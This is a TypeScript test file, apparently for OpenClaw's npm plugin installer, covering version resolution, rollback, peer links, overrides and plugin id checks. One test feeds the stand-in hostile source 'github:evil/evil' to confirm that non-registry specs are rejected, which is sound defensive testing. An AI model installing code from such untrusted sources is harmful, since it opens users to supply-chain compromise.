          compat: { pluginApi: ">=2026.5.28-beta.3" },
        },
      },
    ]);

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/msteams@beta",
      mode: "update",
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    assert(result.ok, JSON.stringify(result));
    expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/msteams@2026.5.28-beta.3");
    expect(result.npmResolution?.version).toBe("2026.5.28-beta.3");
    expect(warnings.join("\n")).toContain(
      "using newest compatible @openclaw/msteams@2026.5.28-beta.3",
    );
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: "@openclaw/msteams",
    });
    const managedManifest = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package.json"), "utf8"),
    ) as { dependencies?: Record<string, string> };
    expect(managedManifest.dependencies?.["@openclaw/msteams"]).toBe("2026.5.28-beta.3");
  });

  it.each([
    ["does not resolve explicit prerelease tags to stable compatible versions", "2026.5.27"],
    [
      "does not resolve explicit prerelease tags to a different prerelease channel",
      "2026.5.28-alpha.10",
    ],
  ])("%s", async (_name, candidateVersion) => {
    vi.stubEnv("OPENCLAW_COMPATIBILITY_HOST_VERSION", "2026.5.28-beta.3");

    mockNpmViewAndInstallMany([
      {
        spec: "@openclaw/msteams@beta",
        packageName: "@openclaw/msteams",
        version: "2026.5.28-beta.4",
        pluginId: "msteams",
        npmRoot,
        versions: [candidateVersion, "2026.5.28-beta.4"],
        openclaw: {
          extensions: ["./dist/index.js"],
          compat: { pluginApi: ">=2026.5.28-beta.4" },
        },
      },
    ]);

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/msteams@beta",
      mode: "update",
    });

    assert(!result.ok, JSON.stringify(result));
    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_PLUGIN_API);
    expect(result.error).toContain("requires plugin API >=2026.5.28-beta.4");
    expect(
      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
    ).toBe(false);
  });

  it.runIf(process.platform !== "win32")(
    "repairs root openclaw materialized by npm peer handling",
    async () => {
      mockNpmViewAndInstall({
        spec: "required-peer-plugin@1.0.0",
        peerDependencies: { openclaw: "^2026.0.0" },
        materializesRootOpenClaw: true,
      });

      const result = await installPluginFromNpmSpec({
        spec: "required-peer-plugin@1.0.0",
      });

      expect(result.ok).toBe(true);
      const npmProjectRoot = resolvePluginNpmProjectDir({
        npmDir: npmRoot,
        packageName: "required-peer-plugin",
      });
      const requiredPeerPluginDir = resolveTestPluginPackageDir(npmRoot, "required-peer-plugin");
      expect(fs.existsSync(path.join(npmProjectRoot, "node_modules", "openclaw"))).toBe(false);
      const lockfile = JSON.parse(
        fs.readFileSync(path.join(npmProjectRoot, "package-lock.json"), "utf8"),
      ) as {
        packages?: Record<string, unknown>;
      };
      expect(lockfile.packages?.["node_modules/openclaw"]).toBeUndefined();
      expect(
        fs.lstatSync(path.join(requiredPeerPluginDir, "node_modules", "openclaw")).isSymbolicLink(),
      ).toBe(true);
    },
  );

  it("repairs stale managed openclaw root packages before npm plugin installs", async () => {
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: "@openclaw/discord",
    });
    fs.mkdirSync(path.join(npmProjectRoot, "node_modules", "openclaw"), { recursive: true });
    writeJson(path.join(npmProjectRoot, "package.json"), {
      private: true,
      dependencies: {
        openclaw: "2026.5.4",
      },
    });
    writeJson(path.join(npmProjectRoot, "package-lock.json"), {
      lockfileVersion: 3,
      packages: {
        "": {
          dependencies: {
            openclaw: "2026.5.4",
          },
        },
        "node_modules/openclaw": {
          version: "2026.5.4",
          resolved: "https://registry.npmjs.org/openclaw/-/openclaw-2026.5.4.tgz",
        },
      },
      dependencies: {
        openclaw: {
          version: "2026.5.4",
        },
      },
    });
    writeJson(path.join(npmProjectRoot, "node_modules", "openclaw", "package.json"), {
      name: "openclaw",
      version: "2026.5.4",
    });

    mockNpmViewAndInstall({
      spec: "@openclaw/discord@beta",
      version: "2026.5.5-beta.1",
      pluginId: "discord",
      peerDependencies: { openclaw: ">=2026.5.5-beta.1" },
      expectedDependencySpec: "2026.5.5-beta.1",
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/discord@beta",
    });

    expect(result.ok).toBe(true);
    const manifest = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package.json"), "utf8"),
    ) as { dependencies?: Record<string, string> };
    expect(manifest.dependencies).not.toHaveProperty("openclaw");
    expect(manifest.dependencies?.["@openclaw/discord"]).toBe("2026.5.5-beta.1");
    const lockfile = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package-lock.json"), "utf8"),
    ) as {
      packages?: Record<string, unknown>;
      dependencies?: Record<string, unknown>;
    };
    expect(lockfile.packages?.["node_modules/openclaw"]).toBeUndefined();
    expect(lockfile.dependencies?.openclaw).toBeUndefined();
  });

  it("preserves the active host openclaw runtime package during npm plugin installs", async () => {
    const hostPackageRoot = path.join(npmRoot, "node_modules", "openclaw");
    fs.mkdirSync(hostPackageRoot, { recursive: true });
    writeJson(path.join(npmRoot, "package.json"), {
      private: true,
      dependencies: {
        openclaw: "2026.5.12-beta.6",
      },
    });
    writeJson(path.join(npmRoot, "package-lock.json"), {
      lockfileVersion: 3,
      packages: {
        "": {
          dependencies: {
            openclaw: "2026.5.12-beta.6",
          },
        },
        "node_modules/openclaw": {
          version: "2026.5.12-beta.6",
        },
      },
    });
    writeJson(path.join(hostPackageRoot, "package.json"), {
      name: "openclaw",
      version: "2026.5.12-beta.6",
    });

    resolveOpenClawPackageRootSyncMock.mockReturnValue(hostPackageRoot);
    mockNpmViewAndInstall({
      spec: "@xdarkicex/openclaw-memory-libravdb@1.4.69",
      version: "1.4.69",
      pluginId: "libravdb-memory",
      expectedDependencySpec: "1.4.69",
    });

    const result = await installPluginFromNpmSpec({
      spec: "@xdarkicex/openclaw-memory-libravdb@1.4.69",
    });

    assert(result.ok, JSON.stringify(result));
    const baseManifest = JSON.parse(
      fs.readFileSync(path.join(npmRoot, "package.json"), "utf8"),
    ) as { dependencies?: Record<string, string> };
    expect(baseManifest.dependencies?.openclaw).toBe("2026.5.12-beta.6");
    expect(baseManifest.dependencies?.["@xdarkicex/openclaw-memory-libravdb"]).toBeUndefined();
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: "@xdarkicex/openclaw-memory-libravdb",
    });
    const projectManifest = JSON.parse(
      fs.readFileSync(path.join(npmProjectRoot, "package.json"), "utf8"),
    ) as { dependencies?: Record<string, string> };
    expect(projectManifest.dependencies?.["@xdarkicex/openclaw-memory-libravdb"]).toBe("1.4.69");
    expect(fs.existsSync(hostPackageRoot)).toBe(true);
    expect(result.targetDir).toBe(
      resolveTestPluginPackageDir(npmRoot, "@xdarkicex/openclaw-memory-libravdb"),
    );
    expect(
      runCommandWithTimeoutMock.mock.calls.some(
        ([argv]) =>
          Array.isArray(argv) &&
          argv[0] === "npm" &&
          argv[1] === "uninstall" &&
          argv.includes("openclaw"),
      ),
    ).toBe(false);
  });

  registerManagedNpmDependencyTests({
    makeTempDir: () => suiteTempRootTracker.makeTempDir(),
    writeInstalledNpmPlugin,
    mockNpmViewAndInstall,
    runCommandWithTimeoutMock,
    resolveOpenClawPackageRootSyncMock,
    installPluginFromNpmSpec,
    resolveTestPluginPackageDir,
    isManagedNpmInstallCommand,
  });

  it("restores the managed project after a post-install throw and allows retry", async () => {
    const stateDir = suiteTempRootTracker.makeTempDir();
    const packageName = "throw-rollback-package";
    const pluginId = "throw-rollback-plugin";
    const spec = `${packageName}@1.0.0`;
    const archivePath = path.join(stateDir, "plugin.tgz");
    fs.writeFileSync(archivePath, "fixture archive", "utf8");
    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
    writeInstalledNpmPlugin({
      npmRoot: npmProjectRoot,
      packageName: "existing-package",
      version: "1.0.0",
    });
    fs.writeFileSync(path.join(npmProjectRoot, "package.json"), '{"private":true}\n');
    fs.writeFileSync(path.join(npmProjectRoot, "package-lock.json"), '{"lockfileVersion":3}\n');
    const projectBefore = readTextFileTree(npmProjectRoot);
    mockNpmViewAndInstallMany([
      { spec, packArchivePath: archivePath, packageName, pluginId, version: "1.0.0", npmRoot },
    ]);
    const failure = new Error("post-install logger failure");
    const info = vi.fn((message: string) => {
      if (message.startsWith("Plugin manifest id")) {
        expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
        throw failure;
      }
    });
    const install = () => {
      const params = requestDeferredPluginInstall({ npmDir: npmRoot, logger: { info } });
      return installPluginFromNpmPackArchive({ ...params, archivePath });
    };

    await expect(install()).rejects.toBe(failure);
    expect.soft(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);

    info.mockImplementation(() => {});
    const retry = await install();
    expect(retry).toMatchObject({ ok: true, pluginId });
    await resolvePluginInstallTransaction(retry)?.commit();
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
  });

  it.each([
    { source: "npm", initialProject: "absent" },
    { source: "npm-pack", initialProject: "empty" },
  ] as const)(
    "preserves an $initialProject managed project after refused $source relocation and permits retry",
    async ({ source, initialProject }) => {
      const stateDir = suiteTempRootTracker.makeTempDir();
      const packageName = "relocation-fixture";
      const spec = `${packageName}@1.0.0`;
      const archivePath = path.join(stateDir, "plugin.tgz");
      fs.writeFileSync(archivePath, "fixture archive", "utf8");
      const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
      if (initialProject === "empty") {
        fs.mkdirSync(npmProjectRoot, { recursive: true });
      }
      mockNpmViewAndInstallMany([
        { spec, packArchivePath: archivePath, packageName, version: "1.0.0", npmRoot },
      ]);
      const refused = new Error("artifact consent refused");
      const onBeforePluginArtifactCommit = vi.fn(async () => {});
      onBeforePluginArtifactCommit.mockRejectedValueOnce(refused);
      const install = () => {
        const params = {
          mode: "update" as const,
          onBeforePluginArtifactCommit,
        };
        return source === "npm"
          ? installPluginFromNpmSpec({ ...params, spec })
          : installPluginFromNpmPackArchive({ ...params, archivePath });
      };
      await expect(install()).rejects.toBe(refused);
      expect(fs.existsSync(npmProjectRoot)).toBe(initialProject === "empty");
      if (initialProject === "empty") {
        expect(fs.readdirSync(npmProjectRoot)).toEqual([]);
      }
      const retry = await install();
      expect(retry).toMatchObject({ ok: true, pluginId: packageName });
      expect(
        fs.existsSync(
          path.join(resolveTestPluginPackageDir(npmRoot, packageName), "dist", "index.js"),
        ),
      ).toBe(true);
    },
  );

  it.each(["success", "failure"] as const)(
    "preserves host peer links across a staged npm update ending in %s",
    async (outcome) => {
      const packageName = "@openclaw/peer-fixture";
      const hostRoot = suiteTempRootTracker.makeTempDir();
      fs.writeFileSync(
        path.join(hostRoot, "package.json"),
        '{"name":"openclaw","version":"0.0.0-test"}\n',
      );
      resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
      const fixture = (version: string) => ({
        spec: `${packageName}@${version}`,
        packageName,
        pluginId: "peer-fixture",
        version,
        npmRoot,
        peerDependencies: { openclaw: "*" },
      });
      mockNpmViewAndInstall(fixture("1.0.0"));
      const first = await installPluginFromNpmSpec({
        spec: `${packageName}@1.0.0`,
      });
      assert(first.ok, JSON.stringify(first));
      const oldPeerLink = path.join(first.targetDir, "node_modules", "openclaw");
      await expect(fs.promises.realpath(oldPeerLink)).resolves.toBe(
        await fs.promises.realpath(hostRoot),
      );
      mockNpmViewAndInstall(fixture("2.0.0"));
      if (outcome === "failure") {
        const delegate = runCommandWithTimeoutMock.getMockImplementation()!;
        runCommandWithTimeoutMock.mockImplementation(async (argv, options) =>
          isManagedNpmInstallCommand(argv)
            ? failedSpawn("registry unavailable")
            : delegate(argv, options),
        );
      }
      const onBeforePluginArtifactCommit = vi.fn(
        async (artifact: PluginInstallArtifactConsentRequest) => {
          await expect(
            fs.promises.realpath(path.join(artifact.stagedArtifactDir, "node_modules", "openclaw")),
          ).resolves.toBe(await fs.promises.realpath(hostRoot));
        },
      );
      const updated = await installPluginFromNpmSpec({
        spec: `${packageName}@2.0.0`,
        mode: "update",
        onBeforePluginArtifactCommit,
      });
      expect(updated.ok).toBe(outcome === "success");
      expect(onBeforePluginArtifactCommit).toHaveBeenCalledTimes(outcome === "success" ? 1 : 0);
      if (updated.ok) {
        await expect(
          fs.promises.realpath(path.join(updated.targetDir, "node_modules", "openclaw")),
        ).resolves.toBe(await fs.promises.realpath(hostRoot));
      } else {
        expect(updated.error).toContain("registry unavailable");
      }
      await expect(fs.promises.realpath(oldPeerLink)).resolves.toBe(
        await fs.promises.realpath(hostRoot),
      );
    },
  );

  it("normalizes selectors before npm planning and retries only unsupported aliases", async () => {
    const hostRoot = suiteTempRootTracker.makeTempDir();
    writeJson(path.join(hostRoot, "package.json"), {
      name: "openclaw",
    });
    fs.writeFileSync(
      path.join(hostRoot, "pnpm-workspace.yaml"),
      [
        "overrides:",
        "  axios: 1.18.0",
        '  node-domexception: "npm:@nolyfill/domexception@1.0.28"',
        '  "range-target@>1": 2.0.0',
        '  "werift-ice@0.2.2>ip": "npm:neoip@3.1.0"',
        "  nested:",
        '    alias: "npm:@scope/alias@1.0.0"',
        "    semver: 1.2.3",
        "",
      ].join("\n"),
      "utf8",
    );
    resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
    mockNpmViewAndInstall({
      spec: "@openclaw/voice-call@0.0.1",
      version: "0.0.1",
      pluginId: "voice-call",
    });
    const baseImplementation = runCommandWithTimeoutMock.getMockImplementation();
    let installAttempts = 0;
    runCommandWithTimeoutMock.mockImplementation(
      async (argv: string[], options?: { cwd?: string }) => {
        if (isNpmPeerPlannerInstallCommand(argv)) {
          const manifest = JSON.parse(
            fs.readFileSync(path.join(options?.cwd ?? "", "package.json"), "utf8"),
          ) as { overrides?: Record<string, unknown> };
          expect(manifest.overrides).not.toHaveProperty("werift-ice@0.2.2>ip");
          expect(manifest.overrides?.["range-target@>1"]).toBe("2.0.0");
        }
        if (isManagedNpmInstallCommand(argv)) {
          installAttempts += 1;
          const npmProjectRoot = options?.cwd;
          if (!npmProjectRoot) {
            throw new Error("expected npm install cwd");
          }
          const manifest = JSON.parse(
            fs.readFileSync(path.join(npmProjectRoot, "package.json"), "utf8"),
          ) as { overrides?: Record<string, unknown>; openclaw?: { managedOverrides?: string[] } };
          if (installAttempts === 1) {
            expect(manifest.overrides?.["node-domexception"]).toBe(
              "npm:@nolyfill/domexception@1.0.28",
            );
            expect(manifest.overrides?.["range-target@>1"]).toBe("2.0.0");
            expect(manifest.overrides).not.toHaveProperty("werift-ice@0.2.2>ip");
            expect(manifest.overrides).toEqual({
              axios: "1.18.0",
              nested: {
                alias: "npm:@scope/alias@1.0.0",
                semver: "1.2.3",
              },
              "node-domexception": "npm:@nolyfill/domexception@1.0.28",
              "range-target@>1": "2.0.0",
            });
            expect(manifest.openclaw?.managedOverrides).toEqual([
              "axios",
              "nested",
              "node-domexception",
              "range-target@>1",
            ]);
            return {
              code: 1,
              stdout: "",
              stderr: "npm ERR! Invalid comparator: npm:@nolyfill/domexception@1.0.28",
              signal: null,
              killed: false,
              termination: "exit" as const,
            };
          }
          expect(manifest.overrides).toEqual({
            axios: "1.18.0",
            nested: {
              semver: "1.2.3",
            },
            "range-target@>1": "2.0.0",
          });
          expect(manifest.openclaw?.managedOverrides).toEqual([
            "axios",
            "nested",
            "range-target@>1",
          ]);
        }
        return await baseImplementation?.(argv, options);
      },
    );

    const warnings: string[] = [];
    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/voice-call@0.0.1",
      logger: { info: () => {}, warn: (message) => warnings.push(message) },
    });

    expect(result.ok).toBe(true);
    expect(installAttempts).toBe(2);
    expect(warnings).toEqual([
      "npm rejected managed npm overrides; retrying plugin install without npm-incompatible overrides for this npm version.",
    ]);
  });

  it.each([
    {
      name: "missing manifest with a different expected id",
      packageName: "@openclaw/comfy-provider",
      expectedPluginId: "comfy",
      nativeManifest: "missing",
    },
    {
      name: "malformed manifest",
      packageName: "@openclaw/official-malformed",
      expectedPluginId: "official-malformed",
      nativeManifest: "malformed",
    },
  ] as const)("rejects a trusted official npm plugin with a $name", async (testCase) => {
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName: testCase.packageName,
    });
    mockNpmViewAndInstall({
      spec: testCase.packageName,
      packageName: testCase.packageName,
      version: "0.0.0",
      pluginId: testCase.expectedPluginId,
      nativeManifest: testCase.nativeManifest,
    });

    const result = await installPluginFromNpmSpec({
      spec: testCase.packageName,
      expectedPluginId: testCase.expectedPluginId,
      trustedSourceLinkedOfficialInstall: true,
    });

    assert(!result.ok, JSON.stringify(result));
    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_PLUGIN_MANIFEST);
    expect(result.error).toContain("package missing valid openclaw.plugin.json");
    expect(result.error).not.toContain("plugin id mismatch");
    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, testCase.packageName))).toBe(false);
    expect(fs.existsSync(path.join(npmProjectRoot, "package.json"))).toBe(false);
    expect(fs.existsSync(path.join(npmProjectRoot, "package-lock.json"))).toBe(false);
    expect(fs.existsSync(path.join(npmProjectRoot, "node_modules"))).toBe(false);
  });

  it("preserves untrusted manifestless npm updates keyed by the legacy package name", async () => {
    const packageName = "@third-party/legacy-plugin";
    mockNpmViewAndInstall({
      spec: packageName,
      nativeManifest: "missing",
    });

    const result = await installPluginFromNpmSpec({
      spec: packageName,
      expectedPluginId: "legacy-plugin",
      trustedSourceLinkedOfficialInstall: false,
      mode: "update",
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.pluginId).toBe(packageName);
      expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
    }
  });

  it("accepts a trusted manifest-declared plugin id replacement during update", async () => {
    mockNpmViewAndInstall({
      spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
      version: "2026.8.1-beta.0",
      pluginId: "fish-audio-speech",
      legacyPluginIds: ["fish-audio"],
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
      mode: "update",
      expectedPluginId: "fish-audio",
      expectedReplacementPluginId: "fish-audio-speech",
      trustedSourceLinkedOfficialInstall: true,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.pluginId).toBe("fish-audio-speech");
    }
  });

  it("accepts a trusted catalog lookup id replacement during update", async () => {
    mockNpmViewAndInstall({
      spec: "@tencent-connect/openclaw-qqbot@2.0.3",
      version: "2.0.3",
      pluginId: "openclaw-qqbot",
    });

    const result = await installPluginFromNpmSpec({
      spec: "@tencent-connect/openclaw-qqbot@2.0.3",
      mode: "update",
      expectedPluginId: "qqbot",
      expectedReplacementPluginId: "openclaw-qqbot",
      trustedSourceLinkedOfficialInstall: true,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.pluginId).toBe("openclaw-qqbot");
    }
  });

  it.each([
    {
      name: "untrusted source",
      mode: "update" as const,
      trustedSourceLinkedOfficialInstall: false,
      expectedReplacementPluginId: "fish-audio-speech",
      legacyPluginIds: ["fish-audio"],
    },
    {
      name: "different catalog replacement",
      mode: "update" as const,
      trustedSourceLinkedOfficialInstall: true,
      expectedReplacementPluginId: "different-plugin",
      legacyPluginIds: ["fish-audio"],
    },
    {
      name: "fresh install",
      mode: "install" as const,
      trustedSourceLinkedOfficialInstall: true,
      expectedReplacementPluginId: "fish-audio-speech",
      legacyPluginIds: ["fish-audio"],
    },
    {
      name: "manifest without the legacy id",
      mode: "update" as const,
      trustedSourceLinkedOfficialInstall: true,
      expectedReplacementPluginId: "fish-audio-speech",
      legacyPluginIds: undefined,
    },
  ])("rejects a manifest id replacement for a $name", async (testCase) => {
    mockNpmViewAndInstall({
      spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
      version: "2026.8.1-beta.0",
      pluginId: "fish-audio-speech",
      legacyPluginIds: testCase.legacyPluginIds,
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/fish-audio-speech@2026.8.1-beta.0",
      mode: testCase.mode,
      expectedPluginId: "fish-audio",
      expectedReplacementPluginId: testCase.expectedReplacementPluginId,
      trustedSourceLinkedOfficialInstall: testCase.trustedSourceLinkedOfficialInstall,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.PLUGIN_ID_MISMATCH);
    }
  });

  it("rejects non-registry npm specs", async () => {
    const result = await installPluginFromNpmSpec({ spec: "github:evil/evil" });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("unsupported npm spec");
      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NPM_SPEC);
    }
  });

  it("rejects duplicate npm installs unless update mode is requested", async () => {
    const installRoot = resolveTestPluginPackageDir(npmRoot, "@openclaw/voice-call");
    fs.mkdirSync(installRoot, { recursive: true });
    mockNpmViewMetadataResult(runCommandWithTimeoutMock, {
      name: "@openclaw/voice-call",
      version: "0.0.1",
      integrity: "sha512-plugin-test",
      shasum: "pluginshasum",
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/voice-call@0.0.1",
      mode: "install",
    });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("plugin already exists");
      expect(result.error).toContain(installRoot);
    }
    expect(
      runCommandWithTimeoutMock.mock.calls.some(
        (call) => Array.isArray(call[0]) && call[0][0] === "npm" && call[0][1] === "install",
      ),
    ).toBe(false);
  });

  it("classifies npm package-not-found errors with a stable error code", async () => {
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 1,
      stdout: "",
      stderr: "npm ERR! code E404\nnpm ERR! 404 Not Found - GET https://registry.npmjs.org/nope",
      signal: null,
      killed: false,
      termination: "exit",
    });

    const result = await installPluginFromNpmSpec({
      spec: "@openclaw/not-found",
    });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.NPM_PACKAGE_NOT_FOUND);
    }
  });

  it("rejects implicit prerelease npm specs with beta guidance", async () => {
    mockNpmViewMetadataResult(runCommandWithTimeoutMock, {
      name: "@openclaw/voice-call",
      version: "0.0.2-beta.1",
      integrity: "sha512-beta",
      shasum: "betashasum",
    });

    const rejected = await installPluginFromNpmSpec({
      spec: "@openclaw/voice-call",
    });
    expect(rejected.ok).toBe(false);
    if (!rejected.ok) {
      expect(rejected.error).toContain("prerelease version 0.0.2-beta.1");
      expect(rejected.error).toContain('"@openclaw/voice-call@beta"');
    }
  });

  it("falls back to the latest stable version for official prerelease packages", async () => {
    const officialNpmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
    const warnings: string[] = [];
    mockNpmViewAndInstallMany([
      {
        spec: "@openclaw/voice-call",
        packageName: "@openclaw/voice-call",
        version: "0.0.2-beta.1",
        npmRoot: officialNpmRoot,
        versions: ["0.0.1", "0.0.2-beta.1"],
      },
      {
        spec: "@openclaw/voice-call@0.0.1",
        packageName: "@openclaw/voice-call",
        version: "0.0.1",
        pluginId: "voice-call",
        npmRoot: officialNpmRoot,
        expectedDependencySpec: "0.0.1",
      },
    ]);

    const officialFallback = await installPluginFromNpmSpec({
      spec: "@openclaw/voice-call",
      npmDir: officialNpmRoot,
      expectedPluginId: "voice-call",
      trustedSourceLinkedOfficialInstall: true,
      logger: {
        info: () => {},
        warn: (msg: string) => warnings.push(msg),
      },
    });
    assert(officialFallback.ok, JSON.stringify(officialFallback));
    expect(officialFallback.npmResolution?.version).toBe("0.0.1");
    expect(officialFallback.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@0.0.1");
    expect(warnings.join("\n")).toContain("falling back to stable @openclaw/voice-call@0.0.1");
  });

  it("uses the newest prerelease when an official package has no stable versions", async () => {
    const prereleaseOnlyNpmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
    const prereleaseOnlyWarnings: string[] = [];
    mockNpmViewAndInstallMany([
      {
        spec: "@openclaw/voice-call",
        packageName: "@openclaw/voice-call",
        version: "0.0.1-beta.1",
        pluginId: "voice-call",
        npmRoot: prereleaseOnlyNpmRoot,
        versions: ["0.0.1-beta.1", "0.0.2-beta.1"],
      },
      {
        spec: "@openclaw/voice-call@0.0.2-beta.1",
        packageName: "@openclaw/voice-call",
        version: "0.0.2-beta.1",
        pluginId: "voice-call",
        npmRoot: prereleaseOnlyNpmRoot,
        expectedDependencySpec: "0.0.2-beta.1",
      },
    ]);

    const prereleaseOnly = await installPluginFromNpmSpec({
      spec: "@openclaw/voice-call",
      npmDir: prereleaseOnlyNpmRoot,
      expectedPluginId: "voice-call",
      trustedSourceLinkedOfficialInstall: true,
      logger: {
        info: () => {},
        warn: (msg: string) => prereleaseOnlyWarnings.push(msg),
      },
    });
    assert(prereleaseOnly.ok, JSON.stringify(prereleaseOnly));
    expect(prereleaseOnly.npmResolution?.version).toBe("0.0.2-beta.1");
    expect(prereleaseOnly.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@0.0.2-beta.1");
    expect(prereleaseOnlyWarnings.join("\n")).toContain("has no stable npm versions yet");
    expect(prereleaseOnlyWarnings.join("\n")).toContain(
      "using newest prerelease @openclaw/voice-call@0.0.2-beta.1",
    );
  });
});
/* oxlint-disable max-lines -- TODO: split this grandfathered oversized file. */
